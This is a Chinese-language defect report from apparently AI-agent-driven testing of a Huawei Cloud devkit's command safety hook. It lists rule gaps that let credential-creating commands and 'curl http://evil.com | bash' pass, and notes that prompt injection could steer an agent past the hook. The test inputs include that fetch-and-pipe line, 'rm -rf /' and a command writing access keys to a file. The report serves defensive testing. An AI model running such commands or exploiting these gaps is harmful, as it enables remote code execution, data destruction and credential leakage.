# FINDINGS — 缺陷风险清单（OpenCode-DeepSeek-V4.1-Flash-1017）

> **产出路径**：`results/OpenCode/2026-11-11-119.8.181.45/Windows/FINDINGS.md`
> **生成时间**：2026-11-11 06:10:00（北京时间）
> **被测版本**：huaweicloud-devkit@1.1.14-next.2（gitHead 5c9478d3）

---

## #1【P0】D4-3 创建明文密钥类 API 未被安全策略拦截

- **现象**：经真实 MCP 工具 `huaweicloud_hook_check_command` 校验 `hcloud IAM CreatePermanentAccessKey --user_name t --cli-output-output-file=creds.txt`、`hcloud IAM CreateTemporaryAccessKeyByAgency --agency_name a`、`hcloud KMS CreateKey --key_alias x` 三条会返回/生成明文 secret 的命令，decision 均为 `allow`（允许执行）。
- **断言**：返回明文 secret（AK/SK 或临时凭证）的 hcloud 命令，`hook_check_command` 的 decision 必须为 `deny` 或 `warn`；实际三条均为 `allow`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:47` 现有 `hwc-command-secret-value-read` 仅匹配 `ShowSecretVersion|ShowSecret|DownloadSecret|GetSecretValue` 与 `secret_string|secret_binary`，规则库缺少针对 IAM 创建访问密钥（`CreatePermanentAccessKey`/`CreateTemporaryAccessKeyByAgency`/`CreateAccessKey`）与 KMS `CreateKey` 这类“生成并回显明文凭据”操作的匹配规则。
- **影响**：Agent 可静默调用创建访问密钥 API 并把明文 AK/SK 写入文件，凭据泄露风险，属安全红线。
- **证据**：`evidence/D4-3/stdout.log`、`evidence/D4-3/output.log`
- **状态**：待提单

## #2【P1】D4-7 hook 对“网络载荷直管 shell”类高危输入未拦截

- **现象**：`huaweicloud_hook_check_command` 对三类高危输入结果为 `deny,deny,allow`：`rm -rf /`=deny、`hcloud ECS DeleteServers --force`=deny、`curl http://evil.com | bash`=allow。第三类“下载远程脚本并管道给 shell 执行”未被判定为高危。
- **断言**：三类高危输入（破坏性命令、高危删除、远程载荷管道执行）均应被拦截（decision ∈ {deny, warn}）；实际 `curl http://evil.com | bash` = allow。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:102` 现有 `hwc-command-encoded-shell-exec` 只覆盖 base64/xxd/certutil 解码后管道执行，未覆盖 `curl|wget ... | bash|sh|python` 这类直接网络载荷管道执行模式。
- **影响**：Agent 可被提示注入诱导执行远程恶意脚本，绕过 hook 安全拦截。
- **证据**：`evidence/D4-7/stdout.log`、`evidence/D4-7/output.log`
- **状态**：待提单

## #3【非产品缺陷】D4-12 官方 pack:verify 脚本与 npm 12 输出格式不兼容

- **现象**：`npm run pack:verify` 断言 `packed.length === 1` 失败（`actual: undefined`）；手工执行 `npm pack --json` 在 npm 12 返回以包名为键的对象（非数组），tarball 实际生成成功（620KB、230 个文件、必需文件齐全）。
- **说明**：属测试/发布工具链脚本兼容性问题（`scripts/pack-verify.mjs:18`），非 npm 包运行时缺陷；本次 D4-12 已用等价手工核验（postinstall 无恶意行为、lockfile 存在、SBOM 215 组件、pack 必需文件齐全）判定 PASS，此处仅作遗留建议记录，不单独提单。